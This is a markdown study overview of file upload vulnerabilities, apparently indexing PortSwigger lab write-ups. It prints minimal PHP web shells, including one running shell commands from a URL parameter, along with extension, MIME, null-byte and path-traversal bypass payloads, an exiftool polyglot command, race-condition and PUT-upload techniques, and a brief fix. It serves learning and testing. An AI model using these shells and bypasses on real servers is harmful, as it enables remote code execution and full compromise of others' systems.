# File upload vulnerabilities — topic overview & router

Upload a server-executable file (web shell) and request it → **RCE**. Even non-executable uploads can be dangerous (XSS via SVG/HTML, path traversal, DoS). The win condition is getting your file (a) stored with an executable extension in (b) a directory the server will execute, then (c) requesting it. Impact: typically Critical (full server compromise).

## 30-second quick reference

```
# minimal PHP web shell
<?php echo file_get_contents('/home/carlos/secret'); ?>
<?php system($_GET['cmd']); ?>
# then GET /files/avatars/exploit.php?cmd=id
# bypasses:
Content-Type: image/png            # fake MIME
filename=exploit.php (no validation)
extension blacklist -> .phtml .php5 .php7 .phar .shtml ; or .htaccess  (AddType)
obfuscation -> exploit.php.jpg | exploit.pHp | exploit.php%00.jpg | exploit.php%2500.jpg
path traversal -> filename=../exploit.php  (escape non-exec upload dir)
magic bytes/content check -> polyglot: exiftool -Comment='<?php ... ?>' img.jpg
race condition -> request the file during the upload→scan→delete window
```

## Decision map

| Obstacle | Go to | Bypass |
|---|---|---|
| none / only Content-Type checked | [Basics-RCE](Basics-RCE/) | upload `.php` (spoof MIME if needed) |
| extension/content validated, or upload dir non-exec | [Bypasses](Bypasses/) | blacklist/obfuscation/path-traversal/polyglot |
| file scanned then deleted; brief exec window | [Race-condition](Race-condition/) | request during the window |

## Sub-technique folders
- `Basics-RCE/` — unvalidated upload + Content-Type bypass → web shell (2 labs)
- `Bypasses/` — path traversal, extension blacklist, obfuscated extension, content/polyglot (4 labs)
- `Race-condition/` — execute during the scan-and-delete window (1 lab)

## Root cause
Server trusts the uploaded filename/content/MIME and stores files where they're executed. Defenses (MIME check, extension allow/block-list, content inspection) are individually bypassable; the only robust fix is store outside web root + random name + serve via a handler.

## Find it
- Any upload: avatars, attachments, import, profile pics, documents. Note where the file is served (`/files/avatars/<name>`) and whether the extension is preserved.
- Upload a benign `.php`/`.phtml`; if it's stored and executes when requested → RCE. If blocked, ladder the bypasses.

## Exploiting WITHOUT RCE (when execution is blocked)
- **Malicious client-side scripts:** upload an **SVG** or **HTML** file containing `<script>` → stored XSS when another user views it. Also HTML/JS in other served types.
- **Parser vulnerabilities:** the server parses the upload (image/XML/document) → **XXE** via an SVG with external entities → file read / SSRF; image-library bugs (ImageTragick) → RCE.
- **Upload via PUT:** if the server allows `PUT`, write a file directly: `PUT /shell.php` with the shell body (test `OPTIONS` for allowed methods).

## Chaining
- → **RCE** (terminal). SVG/HTML upload → [XSS](../XSS/); SVG external entities → [XXE](../XXE-injection/)/[SSRF](../SSRF/); ZIP/path-traversal → overwrite files.
- `.htaccess`/`web.config` upload → make a benign extension executable. `PUT` method → direct file write.

## Tools
- **Burp Repeater** (edit filename/Content-Type/body), **ExifTool** (polyglot), **Turbo Intruder** (race), reverse-shell payloads.

## References
- https://portswigger.net/web-security/file-upload
